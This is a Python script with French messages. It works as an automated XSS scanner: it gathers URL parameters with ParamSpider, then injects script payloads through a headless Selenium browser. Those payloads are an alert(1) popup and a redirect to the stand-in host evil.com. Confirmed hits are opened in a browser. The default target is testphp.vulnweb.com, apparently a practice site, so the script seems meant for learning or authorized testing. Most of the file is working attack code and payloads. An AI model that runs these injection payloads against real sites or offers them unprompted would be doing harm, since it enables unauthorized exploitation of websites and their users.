import requests
from itertools import product
import subprocess
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from urllib.parse import quote, urlparse
import time
import urllib.parse
import webbrowser
import os
import subprocess
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
import tempfile
import re



def lancer_paramspider(url):
    try:
        print(f"[+] Lancement de : paramspider -d {url}")
        subprocess.run(["paramspider", "-d", url], check=True)
    except subprocess.CalledProcessError as e:
        print("[-] Erreur pendant l'exécution de ParamSpider.")
        print(e)
def scan_XSS(target_url):
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.common.exceptions import NoAlertPresentException

    xss_payloads = [
        "<script>alert(1)</script>"
    ]

    input_file = f"results/{target_url}.txt"
    output_file = f"results/{target_url}_result.txt"

    if not os.path.exists(input_file):
        print(f"[!] Le fichier {input_file} n'existe pas.")
        return

    with open(input_file, "r") as f:
        raw_urls = [line.strip() for line in f if "FUZZ" in line]

    tested_urls = set()
    found_vulns = []

    print(f"🔍 Test de {len(raw_urls)} URLs avec navigateur pour détection de popup alert(1)...\n")

    # Configuration du navigateur Selenium
    temp_profile = f"/tmp/chrome-profile-{os.getpid()}"
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--remote-debugging-port=9222")
    options.add_argument(f"--user-data-dir={temp_profile}")

    service = Service("/usr/bin/chromedriver")
    driver = webdriver.Chrome(service=service, options=options)

    for base_url in raw_urls:
        fuzz_count = base_url.count("FUZZ")
        if fuzz_count == 0:
            continue

        for payload in xss_payloads:
            combos = list(product([payload, "FUZZ"], repeat=fuzz_count))

            for combo in combos:
                test_url = base_url
                for replacement in combo:
                    test_url = test_url.replace("FUZZ", replacement, 1)

                if test_url in tested_urls:
                    continue
                tested_urls.add(test_url)

                print(f"🌐 Test navigateur de : {test_url}")
                try:
                    driver.get(test_url)
                    time.sleep(2)

                    try:
                        alert = driver.switch_to.alert
                        alert_text = alert.text
                        if alert_text == "1":
                            print(f"[✅] XSS détecté via popup ! URL : {test_url}")
                            alert.accept()
                            found_vulns.append(f"Payload: {payload}\nURL: {test_url}\n\n")
                    except NoAlertPresentException:
                        print("[❌] Aucune alerte détectée.")

                except Exception as e:
                    print(f"[⚠️] Erreur lors du chargement de la page : {e}")

    driver.quit()

    with open(output_file, "w") as f_out:
        if found_vulns:
            f_out.writelines(found_vulns)
            print(f"✅ Résultats enregistrés dans : {output_file}")
        else:
            f_out.write("Aucune vulnérabilité XSS détectée via popup alert.\n")
            print("✅ Aucun résultat à enregistrer.")
                    

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from urllib.parse import urlparse, quote
import os
import re
import time

import os
import re
import time
import urllib.parse
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service

import os
import re
import urllib.parse
import webbrowser

import os
import re
import urllib.parse
import requests
import webbrowser

def test_xss_redirection(base_url: str):
    """
    Teste si un site est vulnérable à une redirection XSS vers evil.com.
    Si c'est confirmé, ouvre l'URL dans le navigateur par défaut.
    Teste toutes les URLs trouvées jusqu'à trouver une vulnérabilité.
    """
    # 1) Préparer chemin vers fichier résultat
    base_url_sans_schema = re.sub(r"^https?://", "", base_url)
    base_url_sans_schema = base_url_sans_schema.replace("/", "_")
    fichier_result = f"results/{base_url_sans_schema}result.txt"

    if not os.path.exists(fichier_result):
        print(f"[❌] Le fichier {fichier_result} n'existe pas.")
        return False, ""

    # 2) Lire toutes les URLs vulnérables
    try:
        with open(fichier_result, "r", encoding="utf-8") as f:
            lignes = f.readlines()
        
        # Extraire toutes les URLs vulnérables (celles qui contiennent "URL: ")
        urls_vuln = []
        for ligne in lignes:
            if ligne.startswith("URL: "):
                url = ligne[5:].strip()
                urls_vuln.append(url.replace("<script>alert(1)</script>", ""))
        
        if not urls_vuln:
            print(f"[❌] Aucune URL vulnérable trouvée dans {fichier_result}.")
            return False, ""
            
        print(f"[ℹ️] {len(urls_vuln)} URLs vulnérables à tester")
    except Exception as e:
        print(f"[⚠️] Erreur de lecture : {e}")
        return False, ""

    # 3) Créer le payload
    payload = '<script>window.location.href="https://evil.com/"</script>'
    
    # 4) Tester chaque URL
    for url in urls_vuln:
        test_url = f"{url}{urllib.parse.quote(payload)}"
        print(f"\n[ℹ️] Test URL : {test_url}")

        # 5) Envoyer la requête (sans JS) pour voir si le payload est reflété
        try:
            response = requests.get(test_url, timeout=10)
            if response.status_code != 200:
                print(f"[❌] Erreur HTTP {response.status_code}")
                continue  # Passer à l'URL suivante

            if "evil.com" in response.text:
                print("[✅] Le payload XSS est reflété dans la réponse HTML.")
                print("[🚀] Ouverture dans le navigateur pour confirmation visuelle...")
                webbrowser.open(test_url)
                return True, test_url
            else:
                print("[❌] Le payload n'est pas reflété. Pas de redirection détectée.")
                # On continue avec l'URL suivante

        except Exception as e:
            print(f"[⚠️] Erreur réseau : {e}")
            continue  # Passer à l'URL suivante

    print("\n[ℹ️] Aucune des URLs testées n'a permis une redirection XSS")
    return False, ""



def test_XSS(target_url):


    xss_payload = '<script>window.location.href="https://evil.com"</script>'
    encoded_payload = quote(xss_payload)

    try:
        with open(f"results/{target_url}.txt", "r") as f:
            raw_urls = [line.strip() for line in f if "FUZZ" in line]
    except FileNotFoundError:
        print(f"[❌] Fichier results/{target_url}.txt introuvable.")
        return

    tested_urls = set()
    print(f"🔍 Test de {len(raw_urls)} URLs avec navigateur (Selenium)...\n")

    # Configuration compatible avec exécution root
    temp_profile = f"/tmp/chrome-profile-{os.getpid()}"
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--remote-debugging-port=9222")
    options.add_argument(f"--user-data-dir={temp_profile}")

    service = Service("/usr/bin/chromedriver")
    driver = webdriver.Chrome(service=service, options=options)

    for base_url in raw_urls:
        if "FUZZ" not in base_url:
            continue

        test_url = base_url.replace("FUZZ", encoded_payload)
        if test_url in tested_urls:
            continue
        tested_urls.add(test_url)

        print(f"🌐 Test navigateur de : {test_url}")
        try:
            driver.get(test_url)
            time.sleep(3)  # Attendre la redirection JS

            final_url = driver.current_url
            parsed_url = urlparse(final_url)
            print("🌐 Domaine détecté :", parsed_url.netloc)
            redirige = parsed_url.netloc in ["evil.com", "www.evil.com"]

            if redirige:
                print("[✅] Redirection JS détectée vers :", final_url)
                print("🛑 Scan arrêté suite à une redirection confirmée.")
                driver.quit()
                return
            else:
                print("[❌] Pas de redirection JS. URL finale :", final_url)

        except Exception as e:
            print("[⚠️] Erreur navigateur :", e)

    driver.quit()


                    
if __name__ == "__main__":
    #url = input("Entrez l'URL (domaine) cible (ex: example.com) : ").strip()
    url="testphp.vulnweb.com"
    #lancer_paramspider(url)
    #scan_XSS(url)
    #test_XSS(url) 
    test_xss_redirection("http://testphp.vulnweb.com/")
